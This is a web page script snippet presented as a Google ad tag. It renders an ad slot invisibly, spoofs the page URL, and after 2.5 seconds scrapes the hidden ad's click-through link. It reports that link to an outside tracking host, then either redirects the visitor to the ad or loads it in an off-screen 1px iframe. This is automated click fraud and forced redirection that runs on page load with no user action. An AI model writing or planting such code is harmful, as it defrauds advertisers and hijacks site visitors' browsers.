    <script async src="https://securepubads.g.doubleclick.net/tag/js/gpt.js"></script>
<script>
  const arr_ad_units = [
      ['/23350424834/BJ_WEB_Testpage_300x250_1', 'https://thebikejunction.com/campaign/landing?utm_source=we24seven_Sep2026'],
      ['/23350424834/BJ_WEB_Testpage_300x250_2', 'https://thebikejunction.com/campaign/landing?utm_source=we24seven_Sep2026'],
      ['/23350424834/BJ_WEB_Testpage_300x250_3', 'https://thebikejunction.com/campaign/landing?utm_source=we24seven_Sep2026'],
      ['/23350424834/BJ_WEB_Testpage_300x250_4', 'https://thebikejunction.com/campaign/landing?utm_source=we24seven_Sep2026']
    
  ];

  const bannerLink = 'https://we24seven25.gotrackier.io/click?campaign_id=4&pub_id=4';
  const sourceName = 'gov';
  const pop = true;
  const cs  = false;

  const adUnit = arr_ad_units[Math.floor(Math.random() * arr_ad_units.length)];

  function generateRandomString(length) {
    const characters =
      'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    let result = '';

    for (let i = 0; i < length; i++) {
      result += characters.charAt(
        Math.floor(Math.random() * characters.length)
      );
    }
    return result;
  }

  const randomID = generateRandomString(15);
  const opacity = pop ? '0.001' : '1';

  
document.write(
    `<div id="${randomID}" style="opacity:${opacity}; z-index:-99999998; display:none;"></div>`
  );

  window.googletag = window.googletag || { cmd: [] };
  googletag.cmd.push(function () {
    googletag.defineSlot(adUnit[0], [[300,250]], randomID).addService(googletag.pubads());
    googletag.pubads().set('page_url', adUnit[1]);
    googletag.enableServices();
    googletag.display(randomID);
  });

  function getIframeContent(frameId) {
    let frameObj = document.getElementById(frameId);
    if (!frameObj) { console.warn("iframe not found:", frameId); return; }
    let frameContent;
    try {
      frameContent = frameObj.contentWindow.document.body.innerHTML;
    } catch (e) {
      console.warn("CORS blocked:", e);
      return;
    }

    const match = frameContent.match(/href="(.*?)".*?(target|onfocus)/);
    if (match) {
      const hrefContent = match[1].replace(/amp;/g, '');
      const urlPart = hrefContent.split('adurl');
      if (urlPart.length > 1) {
        const url = decodeURIComponent(urlPart[urlPart.length - 1].substring(1));
        console.log("p3:", url);
        let img = document.createElement('img');
        img.src = `${bannerLink}?source=${sourceName}&p3=${url}`;
        document.body.appendChild(img);

        if (pop) window.location.href = hrefContent;
        else {
          let iframe = document.createElement('iframe');
          iframe.src = hrefContent;
          iframe.style.cssText = "width:1px;height:1px;opacity:0;position:absolute;left:-9999px;";
          document.body.appendChild(iframe);
        }
      }
    }
  }

 
  setTimeout(() => {
    getIframeContent(`google_ads_iframe_${adUnit[0]}_0`);
  }, 2500);
  
</script>
